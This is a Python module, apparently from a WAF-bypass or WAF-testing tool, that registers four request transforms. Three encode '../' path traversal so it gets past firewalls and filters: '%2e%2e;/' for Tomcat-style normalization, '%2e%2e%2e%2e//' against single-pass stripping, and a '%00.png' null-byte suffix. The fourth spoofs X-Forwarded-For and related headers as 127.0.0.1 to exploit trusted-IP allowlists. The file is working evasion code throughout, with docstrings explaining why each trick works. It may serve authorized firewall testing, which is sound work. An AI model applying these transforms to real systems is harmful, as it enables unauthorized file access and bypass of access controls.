"""Traversal-class transforms inspired by public bypass tooling.

Sources: Ilias1988/waf-bypass (LFI layers: `..;/`, `....//`, null byte) and
matrixleons/evilwaf (Layer 6 header trust). All are differential-tier: the
wire payload differs from the original and only a stack with the documented
normalizer interprets it back into the traversal.
"""
from __future__ import annotations

from dataclasses import replace
from urllib.parse import urlsplit, urlunsplit

from ..spec import ReqSpec
from . import Ctx, Transform, VENDORS, register


def _rewrite_path(spec: ReqSpec, new_path: str) -> ReqSpec:
    parts = urlsplit(spec.url)
    new_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))
    return replace(spec, url=new_path and new_url or new_url)


@register(Transform(
    id="path_dotdot_semicolon",
    vendors=VENDORS,
    category="path",
    risk="standard",
    docs_path="docs/techniques/path_dotdot_semicolon.md",
    explain="rewrite ../ as %2e%2e;/ for Tomcat-family normalization",
))
def path_dotdot_semicolon(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Encode `../` as `%2e%2e;/` inside the path.

    Tomcat/WebLogic-family fronting servlets strip path parameters (`;jsessionid`)
    BEFORE resolving dot segments, so `..;/` collapses to `/` and the traversal
    survives one normalization pass that signature engines counted as handled.
    Dots are percent-encoded so the client transport cannot pre-normalize them.
    """
    parts = urlsplit(spec.url)
    path = parts.path or "/"
    if "../" not in path:
        return None
    encoded = path.replace("../", "%2e%2e;/")
    return _rewrite_path(spec, encoded)


@register(Transform(
    id="path_collapse_dotdot",
    vendors=VENDORS,
    category="path",
    risk="standard",
    docs_path="docs/techniques/path_collapse_dotdot.md",
    explain="expand ../ to %2e%2e%2e%2e// surviving single-pass filters",
))
def path_collapse_dotdot(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Expand each `../` to `%2e%2e%2e%2e//`.

    Filters that strip exactly one layer of traversal (`....//` -> `../` after
    a single removal pass) re-create the sequence they meant to delete. The
    dots are percent-encoded for transport survival.
    """
    parts = urlsplit(spec.url)
    path = parts.path or "/"
    if "../" not in path:
        return None
    encoded = path.replace("../", "%2e%2e%2e%2e//")
    return _rewrite_path(spec, encoded)


@register(Transform(
    id="null_byte_terminator",
    vendors=VENDORS,
    category="path",
    risk="conditional",
    docs_path="docs/techniques/null_byte_terminator.md",
    explain="append a %00 terminator with a benign extension",
))
def null_byte_terminator(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Append `%00.png` to the path.

    Historic stacks (PHP < 5.3.4, old C string handling) truncate at NUL, so
    validators saw `file.png` while filesystem calls received `file`.
    Modern runtimes reject embedded NULs - kept as an educational conditional.
    """
    parts = urlsplit(spec.url)
    path = parts.path or "/"
    if "%00" in path or "\x00" in path:
        return None
    return _rewrite_path(spec, path + "%00.png")


@register(Transform(
    id="spoof_trusted_ip",
    vendors=VENDORS,
    category="headers",
    risk="conditional",
    docs_path="docs/techniques/spoof_trusted_ip.md",
    explain="inject loopback values into WAF-trusted IP headers",
))
def spoof_trusted_ip(spec: ReqSpec, ctx: Ctx) -> "ReqSpec | None":
    """Set X-Forwarded-For / CF-Connecting-IP / True-Client-IP to 127.0.0.1.

    Wins where the edge trusts inbound instances of these headers for its
    IP reputation/allowlist decisions - a misconfiguration class. Fails
    (and is logged) wherever the edge overwrites them from the socket.
    """
    from . import with_headers

    return with_headers(
        spec,
        **{
            "X-Forwarded-For": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
        },
    )
